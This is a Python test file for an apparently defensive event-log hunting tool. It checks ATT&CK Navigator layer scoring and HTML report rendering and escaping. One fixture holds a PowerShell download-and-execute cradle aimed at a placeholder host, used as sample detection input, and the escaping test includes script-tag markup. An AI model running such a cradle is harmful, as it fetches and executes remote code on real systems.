from datetime import datetime, timedelta, timezone

from crabwalk.catalog import POWERSHELL, SECURITY, SYSTEM
from crabwalk.models import NormalizedEvent
from crabwalk.navigator import build_layer
from crabwalk.report import render_report
from crabwalk.rules import hunt
from crabwalk.rules.base import Finding, HuntContext

T0 = datetime(2026, 8, 1, 12, 0, 0, tzinfo=timezone.utc)


def ev(event_id, *, minutes=0, computer="SRV01", channel=SECURITY, **data):
    return NormalizedEvent(
        timestamp=T0 + timedelta(minutes=minutes),
        channel=channel,
        provider="test",
        event_id=event_id,
        record_id=1,
        computer=computer,
        data=data,
        source_file="test.evtx",
    )


def sample_hunt():
    events = [
        ev(1102, SubjectUserName="admin", SubjectDomainName="CORP"),
        ev(4104, channel=POWERSHELL, minutes=5,
           ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://x')"),
    ]
    return hunt(events)


def test_build_layer_scores_techniques():
    _, findings = sample_hunt()
    layer = build_layer(findings)
    assert layer["domain"] == "enterprise-attack"
    scored = {t["techniqueID"]: t["score"] for t in layer["techniques"] if "score" in t}
    assert scored["T1070.001"] == 1
    assert scored["T1059.001"] == 1
    assert layer["gradient"]["maxValue"] >= 1


def test_build_layer_expands_parents_of_scored_subtechniques():
    # The Navigator collapses sub-techniques under an uncoloured parent; a layer
    # of sub-technique scores would look empty unless parents are expanded.
    _, findings = sample_hunt()
    layer = build_layer(findings)
    entries = {t["techniqueID"]: t for t in layer["techniques"]}
    for parent in ("T1070", "T1059"):
        assert entries[parent]["showSubtechniques"] is True
        assert "score" not in entries[parent]  # layout only; the score is aggregated
    assert layer["layout"]["showAggregateScores"] is True
    assert layer["layout"]["expandedSubtechniques"] == "annotated"


def test_build_layer_empty():
    layer = build_layer([])
    assert layer["techniques"] == []
    assert layer["gradient"]["maxValue"] == 1


def test_render_report_is_self_contained_html():
    ctx, findings = sample_hunt()
    html = render_report(ctx, findings)
    assert html.lstrip().startswith("<meta charset")
    assert "http://" not in html.split("</style>")[0]  # no external assets in CSS
    assert "<svg" in html  # timeline rendered
    assert "T1070.001" in html
    assert "Findings" in html


def test_report_escapes_finding_content():
    finding = Finding(
        rule_id="CW-XXX",
        title="t",
        severity="high",
        techniques=("T1059.001",),
        timestamp=T0,
        host="H<script>",
        summary="payload & <b>bold</b>",
        user="u",
    )
    ctx = HuntContext.build([])
    html = render_report(ctx, [finding])
    assert "<script>" not in html
    assert "H&lt;script&gt;" in html
    assert "payload &amp; &lt;b&gt;bold&lt;/b&gt;" in html


def test_report_handles_no_findings():
    ctx = HuntContext.build([])
    html = render_report(ctx, [])
    assert "No findings." in html


def test_timeline_omits_null_timestamps():
    epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
    findings = [
        Finding("CW-1", "t", "high", ("T1047",), epoch, "H1", "old", "u"),
        Finding("CW-2", "t", "high", ("T1047",), T0, "H2", "new", "u"),
    ]
    html = render_report(HuntContext.build([]), findings)
    assert "1 finding(s) with null timestamps omitted" in html
